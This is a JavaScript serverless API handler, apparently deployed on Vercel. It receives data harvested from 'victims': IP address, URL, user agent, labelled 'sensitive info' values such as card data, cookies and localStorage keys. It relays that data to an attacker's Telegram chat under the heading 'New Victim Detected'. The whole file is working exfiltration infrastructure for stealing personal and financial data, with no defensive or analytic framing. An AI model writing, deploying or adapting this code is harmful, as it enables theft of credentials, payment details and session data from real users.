// src/api/scrape.js

export default async function handler(req, res) {
  // 1. Check Method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    // 2. Parse Body
    let data;
    try {
      data = req.body;
      if (!data) {
        throw new Error("Request body is empty");
      }
    } catch (e) {
      console.error("❌ Failed to parse JSON:", e.message);
      return res.status(400).json({ error: "Invalid JSON" });
    }

    // 3. Log the Data (This appears in Vercel Dashboard > Functions > Logs)
    console.log("✅ Received Data:", JSON.stringify(data).substring(0, 200));

    // 4. Send to Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn("⚠️ Telegram Env Vars Missing");
      // Don't fail the request just because Telegram fails
    } else {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      // Format Message
      let msg = `🔓 *New Victim Detected*\n\n`;
      msg += `🆔 *IP:* \`${data.ip || 'Unknown'}\`\n`;
      msg += `🌐 *URL:* ${data.url || 'N/A'}\n`;
      
      const ua = data.userAgent ? data.userAgent.substring(0, 50) : 'N/A';
      msg += `🖥️ *UA:* \`${ua}...\`\n`;
      
      if (data.sensitiveInfo && Array.isArray(data.sensitiveInfo) && data.sensitiveInfo.length > 0) {
        msg += `\n💳 *Sensitive Info Found:*\n`;
        data.sensitiveInfo.forEach(item => {
          msg += `• ${item.type}: \`${item.value}\`\n`;
        });
      } else {
        msg += `\n💳 *Sensitive Info:* None detected.`;
      }

      const cookieCount = data.cookies ? data.cookies.split(';').filter(c => c.trim()).length : 0;
      msg += `\n🍪 *Cookies:* ${cookieCount} found`;
      
      const storageKeys = Object.keys(data.storage?.localStorage || {}).join(', ');
      msg += `\n💾 *Local Storage Keys:* ${storageKeys || 'None'}`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
          })
        });
        console.log("✅ Telegram Sent Successfully");
      } catch (tgErr) {
        console.error("❌ Telegram Request Failed:", tgErr.message);
      }
    }

    // 5. Success Response
    res.status(200).json({ status: 'ok' });

  } catch (error) {
    // 6. Catch-all error logger
    console.error("💥 CRITICAL ERROR:", error.stack || error.message);
    res.status(500).json({ 
      error: 'Internal Server Error', 
      details: error.message 
    });
  }
}
